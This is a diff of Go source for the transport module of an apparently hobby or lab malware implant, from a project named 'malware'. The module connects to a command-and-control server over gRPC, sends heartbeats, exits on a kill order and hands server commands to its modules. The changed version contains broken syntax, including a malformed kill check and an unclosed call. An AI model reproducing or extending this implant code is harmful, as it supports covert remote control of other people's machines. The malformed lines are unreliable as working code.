@@ -4,17 +4,17 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/connectivity"
-	"google.golang.org/grpc/credentials"
 	"log"
 	"malware/common/messages"
-	pb "malware/common/messages"
 	"malware/common/types"
 	"malware/implant/included_modules"
 	"math/rand"
 	"os"
 	"time"
+
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/connectivity"
+	"google.golang.org/grpc/credentials"
 )
 
 type state struct {
@@ -28,26 +28,24 @@ type settings struct {
 	host  string
 }
 
+// Initialise connection
 func (settings settings) doConnection() {
-	client := pb.NewMalwareClient(settings.state.conn)
+	client := messages.NewMalwareClient(settings.state.conn)
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
-	heartbeat := &pb.CheckCmdRequest{Message: &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}}
-
-	heartbeat.RandomPadding = make([]byte, rand.Intn(100)+1)
-	rand.Read(heartbeat.RandomPadding)
-	reply, err := client.CheckCommandQueue(ctx, heartbeat)
-
+	// Send a heartbeat message to ensure connection
+	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat())
 	if err != nil {
 		return
 	}
 
+	// If a message doesn't contain a heartbeat we need to decode it
 	if reply.GetHeartbeat() != 0 {
-		return // Its a heartbeat so don't do anything
+		return
 	}
 
-	if reply.GetKill() != 0 {
+	if reply.GetKill(() {
 		os.Exit(0)
 	}
 
@@ -56,37 +54,36 @@ func (settings settings) doConnection() {
 		return
 	}
 
-	callback := func(reply *messages.ImplantReply) {
-		client := pb.NewMalwareClient(settings.state.conn)
+	// If message hasn't been handled yet, it is meant for one of the cores.
+	// We provide a callback function to abstract away replying to the C2
+	callback := func(msg *messages.CheckCmdRequest) {
+		client := messages.NewMalwareClient(settings.state.conn)
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 		defer cancel()
-
-		msg := &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}}
-		msg.RandomPadding = make([]byte, rand.Intn(100)+1)
-		rand.Read(msg.RandomPadding)
 
 		client.CheckCommandQueue(ctx, msg)
 	}
 
-	if reply.GetListmodules() != nil {
+	if reply.GetListmodules() {
 		modules := ""
 		for _, module := range included_modules.Modules {
 			modules += module.ID() + " "
 		}
-		callback(&messages.ImplantReply{Module: "list", Args: []byte(modules)})
-		return // Return modules
+		callback(messages.Implant_data("list", []byte(modules))
+		return 
 	}
 
-	handled := false
+
+
 
 	for _, module := range included_modules.Modules {
-		handled = handled || module.HandleMessage(reply, callback)
+		if module.HandleMessage(reply, callback) {
+			return // This message has been handled, no need to do anything more
+		}
 	}
 
-	if !handled {
-		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_MODULE_NOT_IMPL})
-	}
-
+	// Message was not handled, send error message
+	callback(messages.Implant_error(types.ERR_MODULE_NOT_IMPL))
 }
 
 func (settings settings) fixConnection() {
@@ -117,7 +114,7 @@ func (settings settings) listenServer() {
 	settings.state.conn.Close()
 }
 
-func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) bool {
+func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.CheckCmdRequest)) bool {
 	return false
 }
 
@@ -141,3 +138,4 @@ func (settings settings) Shutdown() {
 }
 
 func (settings) ID() string { return "basic_tcp" }
+ 
